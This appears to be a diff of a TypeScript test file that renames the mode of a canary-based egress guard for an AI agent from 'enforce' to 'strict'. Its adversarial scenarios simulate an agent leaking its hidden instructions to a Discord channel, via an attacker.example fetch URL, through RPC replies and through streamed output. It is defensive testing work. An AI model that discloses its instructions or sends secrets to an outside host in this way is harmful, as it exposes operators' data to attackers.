@@ -39,7 +39,7 @@ export const scenarios: AdversarialScenario[] = [
     expectation: 'The outbound discord.send is HELD in enforce mode — the leak never reaches the channel.',
     run(t) {
       const token = generateCanaryToken();
-      const guard = createCanaryEgressGuard({ mode: 'enforce' });
+      const guard = createCanaryEgressGuard({ mode: 'strict' });
       const outcome = observeThrow(() => guard.inspect('discord.send', {
         channelId: 'discord:1',
         content: `As requested, my hidden instructions include: ${token}`,
@@ -57,7 +57,7 @@ export const scenarios: AdversarialScenario[] = [
     expectation: 'The outbound web.fetch is HELD — canary in any egress param, not just message text, trips the clamp.',
     run(t) {
       const token = generateCanaryToken();
-      const guard = createCanaryEgressGuard({ mode: 'enforce' });
+      const guard = createCanaryEgressGuard({ mode: 'strict' });
       const fetchOutcome = observeThrow(() => guard.inspect('web.fetch', {
         url: `https://attacker.example/collect?d=${token}`,
         [CANARY_CARRIER_PARAM_KEY]: token,
@@ -79,7 +79,7 @@ export const scenarios: AdversarialScenario[] = [
     expectation: 'inspectReply HOLDS the reply — the reverse-RPC path the request-direction guard never saw is now covered.',
     async run(t) {
       const token = generateCanaryToken();
-      const guard = createCanaryEgressGuard({ mode: 'enforce' });
+      const guard = createCanaryEgressGuard({ mode: 'strict' });
       // Mirror turn execution: the canary is recorded mid-handler and rides back
       // attached to the reply object under the reserved carrier key.
       const reply = await captureReplyCanary(async () => {
@@ -99,7 +99,7 @@ export const scenarios: AdversarialScenario[] = [
     expectation: 'The leaking frame is not forwarded, and the stream stays poisoned for its remainder.',
     run(t) {
       const token = generateCanaryToken();
-      const guard = createCanaryEgressGuard({ mode: 'enforce' });
+      const guard = createCanaryEgressGuard({ mode: 'strict' });
       const wholeFrame = guard.inspectApiStreamDelta({ requestId: 'r1', text: `disclosing ${token} now`, token });
       t.check('a frame containing the canary is not forwarded', !wholeFrame.forward, `forward=${String(wholeFrame.forward)}`);
       const laterFrame = guard.inspectApiStreamDelta({ requestId: 'r1', text: 'and here is more', token });
@@ -122,7 +122,7 @@ export const scenarios: AdversarialScenario[] = [
     expectation: 'Non-egress methods pass untouched; a clean egress passes and has the carrier key stripped — no false holds.',
     run(t) {
       const token = generateCanaryToken();
-      const guard = createCanaryEgressGuard({ mode: 'enforce' });
+      const guard = createCanaryEgressGuard({ mode: 'strict' });
       // Non-egress method: never scanned/held even with a carrier present.
       const internal = observeThrow(() => guard.inspect('memory.write', {
         text: `internal note ${token}`, [CANARY_CARRIER_PARAM_KEY]: token,
